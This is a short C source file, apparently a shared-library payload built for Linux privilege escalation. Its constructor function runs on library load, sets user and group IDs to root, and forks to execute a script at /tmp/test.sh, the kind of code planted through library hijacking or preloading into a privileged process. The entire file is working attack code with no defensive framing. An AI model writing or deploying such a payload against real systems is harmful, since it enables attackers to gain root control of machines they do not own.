//#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>  
#include <sys/types.h>
#include <sys/wait.h> 
//#include <string.h>
//#include <errno.h>

void test(char* argv[]);

 static void __attribute__((constructor)) _init(void) {
//int main(void) {
	syscall(SYS_setuid, 0);
	syscall(SYS_setgid, 0);
	char* argv[] = { "/tmp/test.sh", NULL };
	test(argv);
	// int e = execlp("/tmp/test.sh", "/tmp/test.sh", NULL);
	/*
	if (e) {
		fprintf(stderr, "%s\n", strerror(errno)); // Error message on stderr (using fprintf)
	}
	*/
	syscall(SYS_exit, 69);
}

void test(char* argv[]) {
	pid_t parent = getpid();
	pid_t pid = fork();

	if (pid == -1)
	{
	    // error, failed to fork()
	} 
	else if (pid > 0)
	{
	    int status;
	    waitpid(pid, &status, 0);
	}
	else 
	{
	    // we are the child
		int e = execv(argv[0], argv);
	}
}
